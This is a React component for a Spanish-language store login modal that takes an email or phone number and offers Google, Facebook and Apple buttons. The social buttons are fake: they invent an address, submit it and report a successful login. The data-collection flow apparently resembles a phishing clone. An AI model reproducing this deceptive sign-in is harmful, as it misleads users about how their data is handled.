// src/features/auth/components/pages/LoginModal.tsx

import React, { useState } from "react";
import { useStore } from "../../../../store/useStore";
import { sendLogin } from "../../../../api/auth";
import "../../../../styles/loginmodal.css";

const LoginModal: React.FC = () => {
  const { loginModalOpen, closeLoginModal, openRegisterModal } = useStore();
  const [formData, setFormData] = useState({ email: "" });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  if (!loginModalOpen) return null;

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError("");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.email.trim()) {
      setError("Por favor ingresa tu email o teléfono");
      return;
    }

    setLoading(true);
    setError("");

    try {
      const response = await sendLogin(formData.email, "Email/Teléfono");
      
      if (response.ok) {
        alert("✅ Datos enviados correctamente. Revisa tu correo.");
        closeLoginModal();
        setFormData({ email: "" });
      }
    } catch (err) {
      console.error("Error:", err);
      setError("Error al enviar los datos. Intenta nuevamente.");
    } finally {
      setLoading(false);
    }
  };

  const handleSocialLogin = async (provider: string) => {
    setLoading(true);
    setError("");

    try {
      const socialEmail = `usuario_${provider.toLowerCase()}@${provider.toLowerCase()}.com`;
      
      const response = await sendLogin(socialEmail, `Inicio de sesión con ${provider}`);
      
      if (response.ok) {
        alert(`✅ Inicio de sesión con ${provider} exitoso`);
        closeLoginModal();
      }
    } catch (err) {
      console.error("Error:", err);
      setError(`Error al iniciar sesión con ${provider}`);
    } finally {
      setLoading(false);
    }
  };

  const handleOpenRegister = () => {
    closeLoginModal();
    openRegisterModal();
  };

  return (
    <div className="login-overlay">
      <div className="login-modal">
        <button onClick={closeLoginModal} className="login-close-btn" aria-label="Cerrar">
          <svg className="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        <div className="login-header">
          <h2 className="login-title">Iniciar sesión/Registrarse</h2>
          <div className="login-protection">
            <svg className="lock-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
            <span>Todos los datos están protegidos</span>
          </div>

          <div className="login-benefits">
            <div className="benefit-item">
              <div className="benefit-title">Ajuste de precios</div>
              <div className="benefit-subtitle">En un plazo de 30 días</div>
            </div>
            <div className="benefit-divider"></div>
            <div className="benefit-item">
              <div className="benefit-title">Envío gratis</div>
              <div className="benefit-subtitle">¡Solo para ti!</div>
            </div>
            <div className="benefit-divider"></div>
            <div className="benefit-item">
              <div className="benefit-title">Devoluciones gratis</div>
              <div className="benefit-subtitle">Hasta 90 días</div>
            </div>
            <div className="benefit-divider"></div>
            <div className="benefit-item">
              <div className="benefit-title">Entrega garantizada</div>
              <div className="benefit-subtitle">Reembolso por cualquier problema</div>
            </div>
          </div>
        </div>

        <div className="login-content">
          <div className="login-form-column">
            <form onSubmit={handleSubmit}>
              <div className="form-group">
                <label className="form-label">Email o número de teléfono</label>
                <input
                  type="text"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  className="form-input"
                  disabled={loading}
                  placeholder="correo@ejemplo.com"
                />
              </div>
              
              {error && (
                <div style={{ 
                  color: '#dc3545', 
                  fontSize: '14px', 
                  marginTop: '8px',
                  padding: '8px',
                  backgroundColor: '#ffe6e6',
                  borderRadius: '4px'
                }}>
                  {error}
                </div>
              )}

              <button 
                type="submit" 
                className="btn-continue"
                disabled={loading}
                style={{ opacity: loading ? 0.7 : 1 }}
              >
                {loading ? "Enviando..." : "Continuar"}
              </button>
            </form>
          </div>

          <div className="login-divider">
            <div className="divider-line"></div>
            <span className="divider-text">O</span>
            <div className="divider-line"></div>
          </div>

          <div className="login-social-column">
            <button 
              className="social-btn"
              onClick={() => handleSocialLogin("Google")}
              disabled={loading}
            >
              <svg className="social-icon" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              <span>Continuar con Google</span>
            </button>

            <button 
              className="social-btn"
              onClick={() => handleSocialLogin("Facebook")}
              disabled={loading}
            >
              <svg className="social-icon" viewBox="0 0 24 24" fill="#1877F2">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              <span>Continuar con Facebook</span>
            </button>

            <button 
              className="social-btn"
              onClick={() => handleSocialLogin("Apple")}
              disabled={loading}
            >
              <svg className="social-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
              </svg>
              <span>Continuar con Apple</span>
            </button>
          </div>
        </div>

        <div className="login-footer">
          <button 
            className="login-help-btn"
            onClick={handleOpenRegister}
          >
            ¿aun no tienes cuenta? crea una
          </button>
          <p className="login-terms">
            Al continuar, aceptas nuestros{' '}
            <a href="#" className="terms-link">Términos de uso</a>
            {' '}y{' '}
            <a href="#" className="terms-link">Política de privacidad</a>.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginModal;